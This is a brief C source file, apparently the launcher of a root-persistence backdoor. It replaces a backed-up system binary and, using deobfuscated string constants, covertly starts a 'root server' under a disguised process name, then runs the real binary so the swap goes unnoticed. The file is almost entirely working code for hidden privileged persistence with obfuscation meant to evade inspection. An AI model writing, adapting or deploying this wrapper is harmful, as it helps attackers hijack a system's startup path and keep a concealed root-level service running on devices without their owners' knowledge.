#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include "shell_params.h"
#include "deobfuscate.h"
#include "ps.h"


int main(int argc, char **argv) {
  int i;
  struct stat st;

  if(find_process(deobfuscate(ROOT_SERVER_ARG0)) || (stat(deobfuscate(ROOT_SERVER), &st) < 0)) {
    execve(deobfuscate(INSTALL_SCRIPT_BAK), argv, NULL);
    return 0;
  }

  // Start our root server 
  if(fork() == 0)
    execl(deobfuscate(ROOT_SERVER), deobfuscate(ROOT_SERVER_ARG0), deobfuscate(OPT), NULL);

  sleep(2);

  // Start the real binary
  if(fork() == 0)
    execl(deobfuscate(INSTALL_SCRIPT_BAK), deobfuscate(INSTALL_SCRIPT_BAK_ARG0), NULL);

  // Keep the process running; we need to keep the process name in the ps list
  while(1) {
  sleep(10);
  }


  return 0;

}
